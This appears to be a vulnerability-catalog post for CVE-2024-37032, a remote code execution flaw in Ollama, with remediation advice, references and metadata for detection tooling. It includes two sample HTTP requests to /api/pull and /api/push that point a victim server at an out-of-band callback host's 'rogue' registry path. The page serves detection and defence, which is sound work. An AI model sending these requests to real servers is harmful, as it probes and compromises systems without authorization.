---
layout: post
cve_id: CVE-2024-37032
title: Ollama - Remote Code Execution
pcap: true
pcap_path: /pcaps/2024/CVE-2024-37032.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-37032.yaml
snort2_rule: N/A
snort3_rule: N/A
author: kaks3c
severity: critical
impact: 'Attackers can exploit improper digest validation to achieve remote code execution
  on Ollama servers.

  '
remediation: 'Update Ollama to version 0.1.34 or later.

  '
reference:
- https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032
- https://nvd.nist.gov/vuln/detail/CVE-2024-37032
- https://github.com/Bi0x/CVE-2024-37032
classification:
  epss-score: 0.9368
  epss-percentile: 0.99833
  cpe: cpe:2.3:a:ollama:ollama:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 1
  vendor: ollama
  product: ollama
  shodan-query: ollama
tags:
- cve
- cve2024
- ollama
- rce
- ai
- vkev
- vuln
---

## üîç Vulnerability Description
Ollama before 0.1.34 does not validate the format of the digest (sha256 with 64 hex digits) when getting the model path, and thus mishandles the TestGetBlobsPath test cases such as fewer than 64 hex digits, more than 64 hex digits, or an initial ../ substring.


## üåê HTTP Request
```nohighlight
POST /api/pull HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_18) AppleWebKit/605.1.18 (KHTML, like Gecko) Version/18 Safari/605.1.18
Connection: close
Content-Length: 116
Content-Type: application/json
Accept-Encoding: gzip
{"name": "http://d5iq799le0o2ht28p9n0fuec61mqb3qiz.oast.online/rogue/38BMrWc6un9mrqTC1W1tAYA9y8r", "insecure": true}
```

```nohighlight
POST /api/push HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Connection: close
Content-Length: 116
Content-Type: application/json
Accept-Encoding: gzip
{"name": "http://d5iq799le0o2ht28p9n0tdf7uchcs5m1x.oast.online/rogue/38BMrWc6un9mrqTC1W1tAYA9y8r", "insecure": true}
```

